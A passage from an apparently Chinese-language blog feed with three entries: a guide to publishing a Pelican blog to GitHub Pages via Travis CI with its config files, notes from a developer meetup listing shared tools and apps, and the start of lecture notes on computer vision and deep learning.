&lt;/ul&gt;</summary><category term="Taiwan"></category><category term="Review"></category><category term="Politics"></category></entry><entry><title>用 Travis CI 自動化發佈 Pelican blog 到 GitHub Pages 上</title><link href="https://blog.m157q.tw/posts/2016/05/08/use-travis-ci-to-publish-pelican-blog-on-github-pages-automatically/" rel="alternate"></link><published>2016-05-08T13:00:07+08:00</published><updated>2016-05-08T13:00:07+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-05-08:posts/2016/05/08/use-travis-ci-to-publish-pelican-blog-on-github-pages-automatically/</id><summary type="html">&lt;h1&gt;前言&lt;/h1&gt;
&lt;p&gt;主要的設定都是參考這篇：&lt;a href="http://blog.mathieu-leplatre.info/publish-your-pelican-blog-on-github-pages-via-travis-ci.html"&gt;Publish your Pelican blog on Github pages via Travis-CI&lt;/a&gt;&lt;br /&gt;
不過因為這篇寫於 2014 年的 1 月，&lt;br /&gt;
有些內容已經有點過時了，跟我實際操作起來上有些差異，&lt;br /&gt;
我有在底下留言給作者了，我自己這邊也順便紀錄一下作法。  &lt;/p&gt;
&lt;p&gt;先把最終的設定檔放上來好了  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/m157q.github.io/blob/source/.travis.yml"&gt;.travis.yml&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/m157q.github.io/blob/source/requirements.txt"&gt;requirements.txt&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/m157q.github.io/blob/source/Makefile"&gt;Makefile&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;作法&lt;/h1&gt;
&lt;p&gt;先到 &lt;code&gt;https://travis-ci.org/profile/${your_github_username}&lt;/code&gt; switch on 該 repo  &lt;/p&gt;
&lt;h2&gt;設定 &lt;code&gt;.travis.yml&lt;/code&gt;&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;language&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;python&lt;/span&gt;  
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;python&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;2.7&amp;#39;&lt;/span&gt;  &lt;span class="c1"&gt;# Pelican 已支援 Python 3，只是我用到一些 Plugins 仍然只能用 Python 2  &lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;branches&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;only&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
  &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;source&lt;/span&gt;  &lt;span class="c1"&gt;# 我是把 Pelican 的原始文字檔放在 source 這個 branch  &lt;/span&gt;
            &lt;span class="c1"&gt;# 如果是一般的 project 應該就是用 master branch  &lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;install&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;pip install -r requirements.txt&lt;/span&gt;  &lt;span class="c1"&gt;# 這邊其實可以直接寫死 pip install ${package}  &lt;/span&gt;
                                   &lt;span class="c1"&gt;# 使用 requirements.txt 純粹是我個人喜好  &lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;script&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;make travis&lt;/span&gt;  &lt;span class="c1"&gt;# 需要在 Makefile 新增 travis 的 label  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;扣掉空行也不過就 10 行  &lt;/p&gt;
&lt;h2&gt;設定 &lt;code&gt;requirements.txt&lt;/code&gt;&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pelican==3.6.3  
markdown==2.6.6       # 因為我用 Markdown 而不是 reStructuredText 寫 blog  
ghp-import==0.4.1     # 讓你 git add 某個資料夾的內容並將其 commit 到另外一個 branch  
beautifulsoup4==4.4.1 # 我用到的 plugin 需要  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;設定 &lt;code&gt;Makefile&lt;/code&gt;&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;OUTPUTDIR&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;BASEDIR&lt;span class="k"&gt;)&lt;/span&gt;/output  
&lt;span class="nv"&gt;GITHUB_REPO_SLUG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;M157q/m157q.github.io  
&lt;span class="nv"&gt;GITHUB_REMOTE_NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;origin  
&lt;span class="nv"&gt;GITHUB_PAGES_BRANCH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;master  
&lt;span class="c"&gt;# 以上參數請根據需求自行替換  &lt;/span&gt;
&lt;span class="nv"&gt;GITHUB_COMMIT_MSG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;shell git --no-pager log --format&lt;span class="o"&gt;=&lt;/span&gt;%s -n &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;  

&lt;span class="nf"&gt;travis&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;publish&lt;/span&gt;  
&lt;span class="c"&gt;    # 為 Travis CI 設定 git 的 user.name 和 user.email  &lt;/span&gt;
&lt;span class="c"&gt;    # 沒設定 email 的話，GitHub 上面看到的 Author 會是 Unknown  &lt;/span&gt;
    git config --global user.name &lt;span class="s2"&gt;&amp;quot;M157q - Travis&amp;quot;&lt;/span&gt;  
    git config --global user.email M157q.tw@gmail.com  

&lt;span class="c"&gt;    # 將 Pelican output dir 的內容 commit 到 GitHub Pages 用的 branch，準備 push 上去  &lt;/span&gt;
&lt;span class="c"&gt;    # 因為我用的是 user site，所以 branch 是 master。如果是 project site 的話，branch 會是 gh-pages  &lt;/span&gt;
    ghp-import -n -r &lt;span class="k"&gt;$(&lt;/span&gt;GITHUB_REMOTE_NAME&lt;span class="k"&gt;)&lt;/span&gt; -b &lt;span class="k"&gt;$(&lt;/span&gt;GITHUB_PAGES_BRANCH&lt;span class="k"&gt;)&lt;/span&gt; -m &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;GITHUB_COMMIT_MSG&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;OUTPUTDIR&lt;span class="k"&gt;)&lt;/span&gt;  

&lt;span class="c"&gt;    # 將剛剛的 commit force push 到 GitHub 上相同的 branch  &lt;/span&gt;
&lt;span class="c"&gt;    # 不用 -f (force push) 的話一定會因為 conflict 而失敗  &lt;/span&gt;
&lt;span class="c"&gt;    # 因為每次 Travis CI build 只會有一個 commit  &lt;/span&gt;
&lt;span class="c"&gt;    # 而且該 branch 只會存一堆靜態檔案，每次變動都很大，沒有啥需要保存 commit log 的必要性。  &lt;/span&gt;
    @git push -fq https://&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;GH_TOKEN&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;@github.com/&lt;span class="k"&gt;$(&lt;/span&gt;GITHUB_REPO_SLUG&lt;span class="k"&gt;)&lt;/span&gt;.git &lt;span class="k"&gt;$(&lt;/span&gt;GITHUB_PAGES_BRANCH&lt;span class="k"&gt;)&lt;/span&gt;:&lt;span class="k"&gt;$(&lt;/span&gt;GITHUB_PAGES_BRANCH&lt;span class="k"&gt;)&lt;/span&gt; &amp;gt; /dev/null  
&lt;span class="c"&gt;    # 用 @ 可以讓 Travis CI 不要顯示這行在 log 上，這樣別人就不會看到你的 GitHub Personal Access Token 了，也就是這裡用的 ${GH_TOKEN}  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;設定 &lt;code&gt;GH_TOKEN&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;先到 &lt;a href="https://github.com/settings/tokens"&gt;https://github.com/settings/tokens&lt;/a&gt; 點選右上方的 &lt;code&gt;Generate new token&lt;/code&gt;&lt;br /&gt;
GitHub 可能會要求輸入密碼，確定現在是本人使用，然後進入 sudo mode。&lt;br /&gt;
填寫 Token description 描述一下這是 Travis CI 要拿來 build Pelican blog 用的，&lt;br /&gt;
主要是給自己看的，怕之後忘記。&lt;br /&gt;
然後 select scopes 就點選 repo 就夠了&lt;br /&gt;
直接移到底下點選 Generate token&lt;br /&gt;
之後就會有一組 GitHub Personal Access Token 可以複製了&lt;br /&gt;
然後我們要將這個 Token 的權限綁到 Travis CI 上，&lt;br /&gt;
讓 Travis CI 有權限將 commit push 到 repo&lt;br /&gt;
這邊有兩種作法，&lt;br /&gt;
一種是直接在 Travis CI 的 Web 介面上設定環境變數（比較簡單），&lt;br /&gt;
另一種是寫在 &lt;code&gt;.travis.yml&lt;/code&gt; 裡頭，但有先透過 travis 將 token 進行加密，&lt;br /&gt;
所以不會在 &lt;code&gt;.travis.yml&lt;/code&gt; 就洩漏 GitHub Personal Access Token（但要輸入一些指令，比較麻煩一點）&lt;br /&gt;
兩種擇一即可，我原本是用 CLI 設定，後來改用 Web Interface 設定。  &lt;/p&gt;
&lt;h3&gt;透過 Travis CI Web Interface 設定&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;到 &lt;code&gt;https://travis-ci.org/${user_name}/${repo_name}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;移到右手邊的 more options 並點選 settings  &lt;/li&gt;
&lt;li&gt;底下有個 Environment Variables，有 Name 和 Value 兩個欄位  &lt;ul&gt;
&lt;li&gt;在 Name 欄位填上 &lt;code&gt;GH_TOKEN&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;在 Value 欄位貼上剛剛複製的 Token  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;然後點選 Add 即可  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;透過 Travis CI CLI 設定&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;首先必須確認有安裝 &lt;code&gt;travis&lt;/code&gt; 的 CLI tool  &lt;/li&gt;
&lt;li&gt;之後在 terminal 輸入 &lt;code&gt;travis encrypt GH_TOKEN=${your_token} --add&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;就會看到 &lt;code&gt;.travis.yml&lt;/code&gt; 裡頭多了一個 block 顯示類似下面的內容  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;env&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
  &lt;span class="n"&gt;global&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="n"&gt;secure&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;xxxxxxxxxx&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;這樣就行了，之後每次 Travis CI 在跑的時候都會把這串值拿去 decode 並解密成原本的 token。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;讓 Travis CI 不要在有 PR 的時候重新產生 blog&lt;/h2&gt;
&lt;p&gt;到 &lt;code&gt;https://travis-ci.org/${user_name}/${repo_name}/settings&lt;/code&gt;，&lt;br /&gt;
把 &lt;code&gt;Build pull requests&lt;/code&gt; 那個 switch 切換成 off  &lt;/p&gt;
&lt;h2&gt;測試有沒有成功&lt;/h2&gt;
&lt;p&gt;都設定完的話，&lt;br /&gt;
之後只要把新的 commit push 到 GitHub 上，&lt;br /&gt;
Travis CI 就會自動 build blog 啦~  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Reference&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.mathieu-leplatre.info/publish-your-pelican-blog-on-github-pages-via-travis-ci.html"&gt;Publish your Pelican blog on Github pages via Travis-CI&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="Pelican"></category><category term="Travis CI"></category><category term="GitHub Pages"></category><category term="Blog"></category></entry><entry><title>Hacker Chips April Note</title><link href="https://blog.m157q.tw/posts/2016/04/24/hacker-chips-april-note/" rel="alternate"></link><published>2016-04-30T02:00:00+08:00</published><updated>2016-04-30T02:00:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-04-24:posts/2016/04/24/hacker-chips-april-note/</id><summary type="html">&lt;p&gt;&lt;a href="https://www.facebook.com/events/472611622946460/"&gt;https://www.facebook.com/events/472611622946460/&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;會知道這個 Meetup 是之前找工作的時候幫了我很多忙的 Jane 告訴我的，&lt;br /&gt;
看完簡介後想說那天晚上也沒事，就報個名。&lt;br /&gt;
原本以為是沒有排名的 Hackathon，&lt;br /&gt;
（個人很討厭那種要排名的假 Hackathon）&lt;br /&gt;
然後就去認識人然後寫寫 side project 這樣，&lt;br /&gt;
結果參加了以後發現其實就是很輕鬆的資訊分享會，&lt;br /&gt;
順便認識其他工程師。&lt;br /&gt;
大家聊聊自己的 side project 和介紹一些自己最近看到的一些有趣的東西這樣。&lt;br /&gt;
Friday Night 純聊天不寫 code 還蠻棒的 哈哈  &lt;/p&gt;
&lt;p&gt;老實說我還滿喜歡這種人數不多的聚會，&lt;br /&gt;
（聽說原本會有更多人來，不過貌似很多人報了名以後都忘記了XD）&lt;br /&gt;
因為參加其他人數比較多的 Meetup 的時候，&lt;br /&gt;
我大多都會遇到一些認識的，不然就是跟認識的一起去，所以就很少認識一些新的朋友。&lt;br /&gt;
而且人一多，又沒認識的人話，&lt;br /&gt;
依我這個社交零分的個性一定是打開電腦龜在角落開始 coding 之類的。  &lt;/p&gt;
&lt;p&gt;這次認識了一些新朋友，而且領域也不太一樣，感覺挺棒的。&lt;br /&gt;
（有兩個人的 side project 都是 Android App，使用者評分分別是 4.3 和 4.7，這分數高的我都要跪了）&lt;br /&gt;
最後 Jane 分享了好多聽都沒聽過的 App，根本就是 App 王啊。&lt;br /&gt;
還省了當天的晚餐和隔天的早餐 感謝 Sudo_ XD&lt;br /&gt;
下次竟然要兩個月後，好久啊啊啊！&lt;br /&gt;
不過這次我好像講太多東西，而且講的有點久，下次有點不知道要講啥了 XDrz  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;然後下面列出在這次聚會中被分享的東西們&lt;br /&gt;
（有些我可能沒記到）  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/linkedin2md"&gt;GitHub - M157q/linkedin2md: Export public LinkedIn profile to Markdown format&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(Python) 把 Public LinkedIn Profile 轉成 Markdown  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/vinta/pangu.js"&gt;GitHub - vinta/pangu.js: 為什麼你們就是不能加個空格呢？&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;空白之神，不要問是什麼，點進去看就知道了。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://chrome.google.com/webstore/detail/%E7%82%BA%E4%BB%80%E9%BA%BC%E4%BD%A0%E5%80%91%E5%B0%B1%E6%98%AF%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%80%8B%E7%A9%BA%E6%A0%BC%E5%91%A2%EF%BC%9F/paphcfdffjnbcgkokihcdjliihicmbpd"&gt;為什麼你們就是不能加個空格呢？ - Chrome Web Store&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/zdict/zdict"&gt;GitHub - zdict/zdict: The last online dictionary framework you need. (?)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(Python) 用 Terminal 查線上字典，適合討厭用 Web browser 開分頁的 CLI 控。（像我就是）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://vinta.ws/blog/695"&gt;軟體工程師的鄙視鏈（程序员的鄙视链） | 真．他媽的&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看了沒笑的人，肯定不是軟體工程師。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://twitter.com/50NerdsofGrey"&gt;50 Nerds of Grey (@50NerdsofGrey) | Twitter&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(English)《格雷的五十種阿宅》（？）  &lt;/li&gt;
&lt;li&gt;裏面有很多很好笑的阿宅哏，像是這個 &lt;a href="https://twitter.com/50NerdsofGrey/status/640985632941064192"&gt;50 Nerds of Grey on Twitter: "'I've been a very bad girl,' she said, biting her lip. 'I need to be punished.' 'Very well,' he said and installed Windows 10 on her laptop."&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://weekly.codetengu.com/"&gt;CodeTengu Weekly 碼天狗週刊&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;由臺灣的工程師們撰寫的技術資訊分享週刊，每星期一早上十點出刊，標題都很有哏。  &lt;/li&gt;
&lt;li&gt;內容比較偏技術導向，較適合工程師們看。  &lt;/li&gt;
&lt;li&gt;報導的領域視當期的 curators 而定。  &lt;/li&gt;
&lt;li&gt;通常報導的內容比較新，而且會有些原創內容。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://weekly.techbridge.cc/"&gt;TechBridge Weekly 技術週刊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;另外一個臺灣的技術週刊，每星期六出刊。  &lt;/li&gt;
&lt;li&gt;比較沒那麼技術導向，從事資訊業的應該都可以看看，範圍蠻廣的，News, Web, Mobile, UI/UX, Data 等等，也會有些跟創業相關的資訊。  &lt;/li&gt;
&lt;li&gt;內容比較多是中國那邊的簡體中文文章  &lt;/li&gt;
&lt;li&gt;沒那麼新，會有一些比較舊的高人氣文章。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://powerbi.microsoft.com/en-us/"&gt;Power BI | Interactive Data Visualization BI Tools&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;由 Microsoft 提供的一個方便的 Data Visualization 工具，要付費。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://chartio.com/"&gt;Cloud Business Intelligence | Chartio&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;也是個 Data Visualization 的工具，有免費版跟付費版，功能好像也蠻強大的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ui.cn/"&gt;UI中国-专业界面交互设计平台&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有很多 templates 可以參考。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.holiestep.msgpeepingtom&amp;amp;hl=zh_TW"&gt;已讀不回助理 - Google Play Android 應用程式&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;其中一位參加者 Tony 的 Side Project  &lt;/li&gt;
&lt;li&gt;可以讓你看到訊息，但對方不會知道你已讀，適合給很常用 IM 聊天的人用。（像我就不太需要QQ）  &lt;/li&gt;
&lt;li&gt;支援 7 種 IM  &lt;/li&gt;
&lt;li&gt;Google Play 評分 4.3  &lt;/li&gt;
&lt;li&gt;可以幫你計算對方的神隱率跟好聊率 （這個可能要用了才知道是什麼）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jintin/jgit"&gt;GitHub - Jintin/jgit: jgit is a command line tool to help you manage multiple separate git-base project in local file system.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;幫你同時對多個 Git Repositories 下同樣的指令  &lt;ul&gt;
&lt;li&gt;我個人的認知是有點類似 &lt;code&gt;git submodule foreach&lt;/code&gt; 的感覺  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Jintin/aliasme"&gt;GitHub - Jintin/aliasme: A shell script to organize your alias in command line.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Jintin/Swimat"&gt;GitHub - Jintin/Swimat: An Xcode formatter plug-in to format your swift code.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;幫你自動 format swift code 的 Xcode Plugin  &lt;ul&gt;
&lt;li&gt;我覺得有點類似 &lt;code&gt;go fmt&lt;/code&gt; 這樣  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.jintin.pm25.tw&amp;amp;hl=zh_TW"&gt;J霧霾 - 台灣空氣品質監控 - Google Play Android 應用程式&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(App) 就是看空氣汙染程度  &lt;/li&gt;
&lt;li&gt;Google Play 上評分 4.7 !!  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.jb.good.night.android.free&amp;amp;hl=en"&gt;Good Night, Android! FREE - Android Apps on Google Play&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;每天晚上 10 點到隔天凌晨 4 點，幫你隨機配對一個人，配對成功 5 秒後，會開啟 7 分鐘的通話，跟陌生人聊天。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.magisto.com/"&gt;Video Editing By Magisto | An Automatic Online Video Editor&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(App) 自動幫你把照片或影片加上許多特效，處理成看起來很專業的影片。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://vitotechnology.com/star-walk.html"&gt;Vito Technology - iPhone, iPad, iPod Touch and MacOS Educational Apps&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(App) 手機對著夜空就會在手機上顯示對著的星星和衛星的位置，特效還蠻潮的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.hackerparadise.org/"&gt;Hacker Paradise: A Traveling Community for Developers, Designers, and Other Creative Types.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;邊環遊世界邊玩邊工作的一群人們  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wanqu.co/"&gt;湾区日报：关注创业与技术，每天推送5篇优质英文文章&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;還不錯的資訊科技新聞分享平台，只由一個人負責維護，採用 ChatOps 管理，詳細可看這篇文章：&lt;a href="https://wanqu.co/blog/2015-05-24-behind-the-scenes.html?s=home"&gt;湾区日报是如何运作的？ | 湾区日报 Blog&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/2014Grab.a.Bite/"&gt;Grab a Bite 幸福提食&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;今天聚會中的培根三明治和火腿三明治就是這家買的，覺得還不錯吃。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;最後幫忙工商服務一下&lt;br /&gt;
&lt;a href="https://sudo.com.tw/"&gt;Sudo_&lt;/a&gt; 最近有在徵 Web Front-end Developer，&lt;br /&gt;
歡迎有興趣的人去應徵 XD  &lt;/p&gt;</summary><category term="Hacker Chips"></category><category term="Sudo_"></category><category term="Meetup"></category></entry><entry><title>視訊訊號處理與深度學習應用</title><link href="https://blog.m157q.tw/posts/2016/04/23/video-signal-processing-and-the-application-of-deep-learning/" rel="alternate"></link><published>2016-04-24T14:43:00+08:00</published><updated>2016-04-24T14:43:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-04-23:posts/2016/04/23/video-signal-processing-and-the-application-of-deep-learning/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href="http://dsc.kktix.cc/events/video-signal"&gt;http://dsc.kktix.cc/events/video-signal&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://datasci.tw/event/vision_and_learning/"&gt;http://datasci.tw/event/vision_and_learning/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Slides: &lt;a href="http://www.slideshare.net/tw_dsconf/ss-61255961"&gt;http://www.slideshare.net/tw_dsconf/ss-61255961&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWITllMazh2a0ctZVk/view?usp=sharing"&gt;備份&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;【判讀】電腦視覺簡介&lt;/h1&gt;
&lt;h2&gt;Real Cases in Computer Vision&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Character Recognition (LeNet)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=4LxlhoemR3A"&gt;Microsoft PhotoSynth&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=ohmajJTcpNk"&gt;Video Reenactment&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Auto Driving  &lt;ul&gt;
&lt;li&gt;Autonomous Cars - NVIDIA Drive PX2  &lt;ul&gt;
&lt;li&gt;Object class recognition  &lt;/li&gt;
&lt;li&gt;Semantic Segmentation  &lt;ul&gt;
&lt;li&gt;分辨出哪裡是車子可以開的地方  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Radar  &lt;ul&gt;
&lt;li&gt;用雷射去掃周邊的環境，可以很快速的去辨認，但跟電腦視覺比較無關。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;電子後照鏡  &lt;ul&gt;
&lt;li&gt;解決視線死角問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=gUIKtqyUIo8"&gt;Grandma rides a Tesla&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Trip Wire  &lt;/li&gt;
&lt;li&gt;Loitering  &lt;/li&gt;
&lt;li&gt;People Count  &lt;/li&gt;
&lt;li&gt;Speed Test  &lt;ul&gt;
&lt;li&gt;不用都卜勒雷達算，直接用影像計算。  &lt;/li&gt;
&lt;li&gt;不小心歪掉就不準了，所以大家知道怎麼躲這種測速了吧 （XDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Smart Daily  &lt;ul&gt;
&lt;li&gt;用監視器的影像辨認人臉打卡。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Smart Fast Forward (Skywatch 的產品)  &lt;ul&gt;
&lt;li&gt;用影像辨識來判斷農舍監視器畫面中哪些時間是有人的，主要是用來定期追蹤是否有記得噴灑農藥。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Structure from motion  &lt;/li&gt;
&lt;li&gt;3D Reconstruction  &lt;/li&gt;
&lt;li&gt;Person tracking  &lt;/li&gt;
&lt;li&gt;Face detection  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Relationship to Data Science?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Rich info, lots of data (in terms of bits)  &lt;/li&gt;
&lt;li&gt;Unstructured, usually without much context / semantics  &lt;/li&gt;
&lt;li&gt;Difficult to process and query  &lt;/li&gt;
&lt;li&gt;We are generating them every day  &lt;ul&gt;
&lt;li&gt;要變成人類歷史的一部份，轉化成可搜尋的話，是個問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;A Brief History of Computer Vision&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;1966, Marvin Minsky  &lt;ul&gt;
&lt;li&gt;50 年過後，我們還沒完全解決這個問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1960's: Interpretation of Synthetic Worlds  &lt;ul&gt;
